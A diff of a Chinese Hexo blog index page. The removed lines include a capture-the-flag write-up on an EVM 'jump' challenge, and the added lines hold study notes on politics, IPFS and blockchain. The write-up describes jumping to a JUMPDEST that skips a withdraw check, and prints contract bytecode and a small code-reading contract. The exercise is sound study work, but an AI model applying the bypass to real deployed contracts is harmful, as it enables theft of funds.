-    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/" class="article-date">
-  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+    <a href="/2024/01/08/%E6%9D%82%E6%96%87/%E6%AF%9B%E6%B3%BD%E4%B8%9C/" class="article-date">
+  <time class="dt-published" datetime="2024-01-08T07:49:45.178Z" itemprop="datePublished">2024-01-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>1.独立自主:走自己的路，把立足点放在依靠自己的基础上，同时积极争取外援，与其他国家合作<br>2.实事求是：从实际出发，理论联系实际，坚持在实践中检验真理和发展真理<br>3.群众路线：一切为了群众，一切起源于群众，从群众中来，到群众中去，把党的正确主张变为群众的自觉行动</p>
+<p>新民主主义革命理论的形成依据：<br>1.近代中国基本国情和中国革命的时代特征：由于封建统治的无能，中国处于一个半殖民地半封建社会的国情，中国的民主革命经历了从旧民主主义革命向新民主主义转变的过程，具有鲜明的时代特征，五四运动是中国转变的标志（两种革命的区别就是一个是蒋介石的革命，一个是毛泽东的革命）<br>2.中国新民主主义革命的实践基础：中国新民主主义经历了艰辛的发展和实践，奠定了革命理论形成的基础</p>
+<p>新民主主义基本纲领的内容：<br>1.政治纲领：推翻帝国主义封建社会，建立一个由无产阶级领导，工农阶级为基础，其余各阶级专政的新民主主义社会<br>2.经济纲领：将封建地主的土地没收分给农民，将官僚资产阶级的资产没收归国家所有，保护民族工商业<br>3.文华纲领：无产阶级领导的反帝反封建的文华，既大众的科学的文华</p>
+<p>党的基本路线：带领全国各族人民，以经济建设为中心，坚持四项基本原则，坚持改革开放，艰苦创业，自力更生，把我国塑造成富强，民主，文明的社会主义现代化强国</p>
+<p>分布式的几个算法：</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://oo90909.github.io/2024/01/08/%E6%9D%82%E6%96%87/%E6%AF%9B%E6%B3%BD%E4%B8%9C/" data-id="clt84owbe0008dkud9t885fd2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/01/07/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2024-01-07T12:38:29.128Z" itemprop="datePublished">2024-01-07</time>
 </a>
     
   </div>
@@ -274,7 +294,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/">jump</a>
+      <a class="p-name article-title" href="/2024/01/07/hello-world/">Hello World</a>
     </h1>
   
 
@@ -282,34 +302,24 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>用了结构体来存储，甚至用来充当mstore的第一个变量，看起来很懵逼，第一个变量不是offset数字吗？<br>结构体要如何充当mstore的第一个变量？</p>
-<p>得到一个结论：结构体充当存储位置时，往往也是一个具体的插槽，如这里的0x80</p>
-<p>执行存储之前的堆栈是这样的(storage没有值)<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image.png" alt="Alt text"><br>执行之后<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-1.png" alt="Alt text"></p>
-<p>后来发现，如果把方法换成withdraw，0x80的值也是0x167<br>所以方法不一样对存储的数据没有任何不同，因此这里的差异只能体现在编译出来的opcode</p>
-<p>执行完28行以后<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-2.png" alt="Alt text"></p>
-<p>想了很久，仍然没有思路。。。当我不知道怎么做的时候，合约名提醒了我</p>
-<hr>
-<p>思路:调用debug后得知，程序停在了jump这里，jump 168，发现0x168后面没有jumpdest，所以没法执行，那么是否存在一种可能，某个jumpdest可以跳过withdrew的require？</p>
-<p>356</p>
-<p><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-3.png" alt="Alt text"><br>这里有很多jumpdest</p>
-<p>寻找到了call函数，也是本篇合约里面唯一的call，说明这里就是withdrew的那部分，那么call前面的第一个jumpdest就是需要跳到的位置，<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-4.png" alt="Alt text"></p>
-<p>经过计算，得到了这个数据，是130<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/image-6.png" alt="Alt text"></p>
-<p>isSolved:true</p>
-<p>本地remix跑通了，但是网页版跑不了。。。<br>网页版也不能debug，如果编译出来的opcode不一样也看不到，就这样吧，我尽力了</p>
-<p>还没结束，有没有可能部署的时候多了一段代码</p>
-<p>这是本地代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806364d98f6e146100515780636a1f9e1914610080575b600080fd5b34801561005d57600080fd5b5061006661008a565b604051808215151515815260200191505060405180910390f35b6100886100ab565b005b6000803073ffffffffffffffffffffffffffffffffffffffff163114905090565b6100b3610249565b6000341415151561012c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f73656e64206d6f6e65792100000000000000000000000000000000000000000081525060200191505060405180910390fd5b610167816000019067ffffffffffffffff16908167ffffffffffffffff1681525050348151018152610164816000015163ffffffff16565b50565b61016f610171565b565b6000341415156101e9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260088152602001807f6e6f206d6f6e657900000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610246573d6000803e3d6000fd5b50565b60206040519081016040528061025e81525090565bfe00a165627a7a7230582036b6db795f3d2506047a2bdd25aa341d1b7d0d30f7bf2b72966af15e963a6af90029</span><br></pre></td></tr></table></figure>
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>这是上链的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">60806040526004361061004b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166364d98f6e81146100505780636a1f9e1914610079575b600080fd5b34801561005c57600080fd5b50610065610083565b604080519115158252519081900360200190f35b610081610089565b005b30311590565b6100916101c4565b3415156100ff57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600b60248201527f73656e64206d6f6e657921000000000000000000000000000000000000000000604482015290519081900360640190fd5b3467ffffffffffffffff610120160180825261011d9063ffffffff16565b50565b61012861012a565b565b341561019757604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600860248201527f6e6f206d6f6e6579000000000000000000000000000000000000000000000000604482015290519081900360640190fd5b6040513390303180156108fc02916000818181858888f1935050505015801561011d573d6000803e3d6000fd5b60408051602081019091526101d7815290565bfe00a165627a7a7230582048e92681d6d38d52fd4cde04a96d8e77b5a18916af1adf6cba1088c86ded54ad0029</span><br></pre></td></tr></table></figure>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>攻击代码(获取部署来的runtimecode)：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract GetCode &#123;</span><br><span class="line"> function getAddressCode(address _target) public view returns (bytes memory</span><br><span class="line">code) &#123;</span><br><span class="line"> uint size;</span><br><span class="line"> assembly &#123;</span><br><span class="line"> size := extcodesize(_target)</span><br><span class="line"> code := mload(0x40)</span><br><span class="line"> mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line"> mstore(code, size)</span><br><span class="line"> extcodecopy(_target, add(code, 0x20), 0, size)</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/jump/" data-id="clriklc7k000jn4uda9b5hl86" data-title="jump" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2024/01/07/hello-world/" data-id="clt84owb40000dkud8hgybuif" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -321,10 +331,10 @@
 
 
   
-    <article id="post-区块链安全/其他/magicChallenge" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-杂文/区块链原理复习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/11/25/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/magicChallenge/" class="article-date">
-  <time class="dt-published" datetime="2023-11-25T13:22:20.028Z" itemprop="datePublished">2023-11-25</time>
+    <a href="/2024/01/06/%E6%9D%82%E6%96%87/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0/" class="article-date">
+  <time class="dt-published" datetime="2024-01-06T04:23:05.959Z" itemprop="datePublished">2024-01-06</time>
 </a>
     
   </div>
@@ -333,12 +343,14 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>思路一：在_transfer中做文章，想办法让selltime多减一次</p>
+        <p>同一通道，同一区块链</p>
+<p>同一组织可以分布在不同区块链中，可以有不同组织，也可以有不同</p>
+<p>同一组织</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/25/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/magicChallenge/" data-id="clriklc7l000kn4udbe3pf2sr" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2024/01/06/%E6%9D%82%E6%96%87/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0/" data-id="clt84owbd0007dkuddtky0pkc" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -350,55 +362,33 @@
 
 
   
-    <article id="post-readme/经济" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-区块链开发/ERC721/ipfs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/" class="article-date">
-  <time class="dt-published" datetime="2023-11-22T02:52:12.813Z" itemprop="datePublished">2023-11-22</time>
+    <a href="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T12:20:07.544Z" itemprop="datePublished">2023-12-15</time>
 </a>
     
   </div>
   <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/">经济</a>
-    </h1>
-  
-
-      </header>
-    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>美国加息操作：</p>
-<p>只是简单的以物易物的时候不需要货币，但是大多数情况是我需要你的丝绸，但你不需要我的石油，国际上这种情况很多，因此需要美元<br>货币：</p>
-<p>中介费：美国利息低的时候，美国商人以3%的利息贷款100万，再在中国以7%的利息贷款出去，收取利息差价</p>
-<p>投资组合理论<br><img src="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/image.png" alt="Alt text"><br>如图，你要存100美元，一开始你存了80到美国，20到阿根廷，利息2.8，美国降息以后，你为了保持总利息不变，会存放更多的钱到阿根廷<br>但是图中只是两个国家的模型，真实情况是世界那么多个国家都可以存款，为什么一定会回流美国呢？</p>
-<p>美国加息，不会导致美元回流，但是会导致借出去钱的总量减少，</p>
-<hr>
-<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=rFV7wdEX-Mo">视频链接</a><br>通俗讲解几种经济模型</p>
-<p>买方：货币 或 <strong>信用</strong><br>来交换卖方的<br>商品 服务 金融资产<br><img src="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/image-1.png" alt="Alt text"></p>
-<p>交易是经济的构成，要理解经济，要先明白，经济是所有市场内的全部交易构成（多方的）</p>
-<p>央行控制着经济中的货币和交易数量，通过<strong>利率</strong>和<strong>发行货币</strong>来实现这种控制</p>
-<p>央行和借款人构成买方和卖方</p>
-<p>利率高时，借贷减少，利率低时，借贷便宜</p>
-<p>一个人的收入必定是另一个人的支出，因此一个人的<strong>生产力</strong>决定了他的长期收入，但由于这种生产力不会短期内剧烈变动，因此这不是经济浮动的主要因素，主要因素是<strong>信贷</strong>。</p>
-<p>设想一个只有生产力而没有信贷的世界：</p>
-<p><img src="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/image-2.png" alt="Alt text"></p>
-<p>产生了这样的曲线</p>
-<p><img src="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/image-3.png" alt="Alt text"></p>
-<p><img src="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/image-4.png" alt="Alt text"><br>这张图更形象<br><img src="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/image-5.png" alt="Alt text"></p>
-<p>在利率低时，人们借钱变得容易，而一个人的支出是另一个人的收入，因此人们的整体货币量会上涨，此时由于货币量和信贷的量上涨，而生产力的提升跟不上货币上涨，生产力出的商品增加不多，便会出现通货膨胀，</p>
-<p>而人们通常以为经济曲线上升会一直持续下去，谁曾想，这只是一个阶段，而人们并不知道，他们只关注当下，反而会在此刻借很多钱，但由于周期不长，人们也有能力偿还，所以信誉不会减少</p>
-<p>但是，一般人们都是想贷款提前消费，而不去还钱，随着人们所贷金额越来越多，总体社会的债务就会增加，此刻降息也没有用了<br><img src="/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/image-6.png" alt="Alt text"><br>(未完待续)</p>
-<hr>
+        <p>ipfs:<br>代替原来的http协议<br>ipfs协议是基于内容寻址，每一个文件、歌曲、电影都会被计算出一个hash，然后ipfs会基于hash寻找</p>
+<p>下载ipfs节点以后要使用<br>ipfs init -profile server<br>来初始化，防止被检测系统检测到</p>
+<h3 id="配置环境（自己配置，别按照教程上教的配置）"><a href="#配置环境（自己配置，别按照教程上教的配置）" class="headerlink" title="配置环境（自己配置，别按照教程上教的配置）"></a>配置环境（自己配置，别按照教程上教的配置）</h3><p><img src="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/image-1.png" alt="Alt text"></p>
+<p>使用命令行上传一份文件到ipfs：<br><img src="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/image.png" alt="Alt text"></p>
+<h3 id="查看ipfs文件（后面是cid）："><a href="#查看ipfs文件（后面是cid）：" class="headerlink" title="查看ipfs文件（后面是cid）："></a>查看ipfs文件（后面是cid）：</h3><p><img src="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/image-2.png" alt="Alt text"></p>
+<p>用网络的方式：<br>用这个命令启动以后（现在你也是一个ipfs节点了）：<br><img src="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/image-3.png" alt="Alt text"></p>
+<p>可以直接复制链接：<br><img src="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/image-4.png" alt="Alt text"></p>
+<p>也可以用curl命令<br><img src="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/image-5.png" alt="Alt text"></p>
+<p>还可以在线观看：<br>在顶部输入localhost:5001&#x2F;webui<br>就可以进入下面的界面<br><img src="/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/image-6.png" alt="Alt text"><br>点击刚刚上传的文件即可</p>
+<p>不知道为什么，ipfs这里访问5001那个发现没有更新，但是访问8080是<br>可以访问到的，说明上传成功了的，以后就用8080来演示ipfs就好了</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/22/readme/%E7%BB%8F%E6%B5%8E/" data-id="clriklc7g0006n4udg7rv7wq6" data-title="经济" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2023/12/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ipfs/" data-id="clt84owbp0011dkudf2vefaq0" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -410,74 +400,24 @@
 
 
   
-    <article id="post-区块链安全/ethernaut/assembly" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-区块链开发/ERC721/nodejs语法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/" class="article-date">
-  <time class="dt-published" datetime="2023-11-20T13:14:54.983Z" itemprop="datePublished">2023-11-20</time>
+    <a href="/2023/12/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/nodejs%E8%AF%AD%E6%B3%95/" class="article-date">
+  <time class="dt-published" datetime="2023-12-13T10:35:17.257Z" itemprop="datePublished">2023-12-13</time>
 </a>
     
   </div>
   <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/">assembly</a>
-    </h1>
-  
-
-      </header>
-    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>在uniswap中看到了可以代替create2的方式<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-30.png" alt="Alt text"><br>于是想去把create2搞懂，但最后没能成功，其实没这个必要，用以前的老方法一样的，但我觉得还是应该把官方创造合约的方法搞明白</p>
-<p>又回到了以前记录汇编学习的地方，发现其实并没有把很多参数搞懂（现在越发觉得搞得非常透彻才是首当其冲，为了非常透彻应该在很短的时间内进行大量的螺旋式学习）</p>
-<p>在研究参数时，发现push的playground出了问题，push32本来该在stack中增加一栏的，但是最后在memory中增加了好几行。于是怀疑evmplayground有问题，想要在更权威的地方试一下，就研究起了assembly（remix中试一试）</p>
-<p><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-32.png" alt="Alt text"></p>
-<p>在solidity中尝试用assembly时，发现yul和assembly并不是一个东西，也发现mload无法与solidity的栈交互，会返回一个值，但是只能pop（），消除掉，而无法像evmplayground那样进栈</p>
-<hr>
-<p>关于mload：<br>001122c00000ccddeeffccaaaabb00ccdd00aabb05600aacc000bb550000af<br>a0|00a0000000000000000000000000000000000000000000000000000000000000|</p>
-<p>此刻mload(0):从第一个32byte的第32个字节开始向左数32byte，为什么这么绕不是从左往右顺着数呢？<br>1122c00000ccddeeffccaaaabb00ccdd00aabb05600aacc000bb550000afa0</p>
-<p>因为如果有很多0的话(如果1122c00000ccddeeffccaaaabb00都是0)，结果就是：<br>ccaaaabb00ccdd00aabb05600aacc000bb550000afa0<br>只有高位的0是多余的才解释的通（544不会写成00544这样）<br>为什么又要从第二个32byte开始数而不是第一个呢？因为要保证取到32bytes，所以需要预留32bytes</p>
-<p>于是就出现了这样匪夷所思的结果<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-33.png" alt="Alt text"></p>
-<hr>
-<p>不仅如此，mstore也是类似的存储方式，从右往左存，且至少保证32bytes所以需要预留32bytes<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-34.png" alt="Alt text"><br>如果数据更长就会变成：<br>1<br>0xabcd<br>00000000000000000000000000000000000000000000000000000000000000ab|cd</p>
-<p>或者<br>mstore(40,a0):</p>
-<p>0000000000000000000000000000000000000000000000000000000000000000|0000000000000000000000000000000000000000000000000000000000000000|00000000000000000000000000000000000000000000000000000000000000a0|</p>
-<hr>
-<h3 id="接下来开始更正更多的结论"><a href="#接下来开始更正更多的结论" class="headerlink" title="接下来开始更正更多的结论"></a>接下来开始更正更多的结论</h3><p><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-5.png" alt="Alt text"></p>
-<p>以magicNumber为例，弄懂每一个solidity语法对应的opcode命令<br>并搞懂常用的assembly如何替换opcode<br>最后用assembly来写这里的命令</p>
-<p>codecopy反而正常的多</p>
-<p>凡是取的数据具有数字意义的，都是从右往左边取（这种情况需要提前空出32byte），具有代码意义的，都是从左往右取，不管哪种情况，数参数（offset）都是从左往右数</p>
-<hr>
-<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/analysing-compilation-output.html">第一篇代码</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.5.0 &lt;0.9.0;</span><br><span class="line">contract C &#123;</span><br><span class="line">    function one() public pure returns (uint) &#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image.png" alt="Alt text"><br>经历了18以前<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-1.png" alt="Alt text"><br>经历了18以后<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-2.png" alt="Alt text"><br>1a以后<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-3.png" alt="Alt text"><br>1b以后<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-4.png" alt="Alt text"><br>是一样的</p>
-<p><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-5.png" alt="Alt text"></p>
-<p>编译时字节码，只会走到return那里，返回运行时字节码</p>
-<p>为什么calldataload可以运行，明明没有任何msg.data<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-7.png" alt="Alt text"><br>那么这里的0x901717d10000000…0000又是从何而来呢<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-8.png" alt="Alt text"><br>这里怎么有e0这么多位<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-9.png" alt="Alt text"><br>最后变成了这样<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-10.png" alt="Alt text"></p>
-<p><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-11.png" alt="Alt text"><br>jump5开始时的栈，30是tag4，这里为什么还要加个00（00好像是对memory有影响，查了发现现在的版本没这个了）<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-12.png" alt="Alt text"><br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-20.png" alt="Alt text"><br>jump4开始时的栈，所以target5的目的就是让其存一个1<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-13.png" alt="Alt text"></p>
-<p>tag4跳完了，3b是tag6<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-14.png" alt="Alt text"><br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-17.png" alt="Alt text"></p>
-<p>跳完tag7，73是tag15<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-16.png" alt="Alt text"></p>
-<p><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-15.png" alt="Alt text"></p>
-<p>跳完tag10，栈顶增加了一个1和5c(tag12)<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-19.png" alt="Alt text"><br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-18.png" alt="Alt text"></p>
-<p>跳完了tag13，5c完成了使命<br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-22.png" alt="Alt text"><br><img src="/2023/11/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/assembly/image-21.png" alt="Alt text"></p>
